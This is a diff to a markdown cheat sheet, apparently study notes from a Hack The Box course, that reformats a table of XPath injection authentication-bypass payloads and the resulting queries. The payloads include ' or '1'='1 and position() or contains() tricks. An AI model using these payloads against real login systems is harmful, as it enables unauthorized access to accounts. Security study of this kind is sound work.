@@ -60,12 +60,12 @@ Union:
 
 #### Authentication Bypass
 
-|Description|Username|Query|
-|---|---|---|
-|Regular Authentication|`htb-stdnt`|`/users/user[username/text()='htb-stdnt' and password/text()='295362c2618a05ba3899904a6a3f5bc0']`|
-|Bypass Authentication with known username|`admin' or '1'='1`|`/users/user[username/text()='admin' or '1'='1' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
-|Bypass Authentication by position|`' or position()=1 or '`|`/users/user[username/text()='' or position()=1 or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
-|Bypass Authentication by substring|`' or contains(.,'admin') or '`|`/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
+| Description                               | Username                        | Query                                                                                                                 |
+| ----------------------------------------- | ------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
+| Regular Authentication                    | `htb-stdnt`                     | `/users/user[username/text()='htb-stdnt' and password/text()='295362c2618a05ba3899904a6a3f5bc0']`                     |
+| Bypass Authentication with known username | `admin' or '1'='1`              | `/users/user[username/text()='admin' or '1'='1' and password/text()='21232f297a57a5a743894a0e4a801fc3']`              |
+| Bypass Authentication by position         | `' or position()=1 or '`        | `/users/user[username/text()='' or position()=1 or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`        |
+| Bypass Authentication by substring        | `' or contains(.,'admin') or '` | `/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']` |
 
 #### Data Exfiltration
 
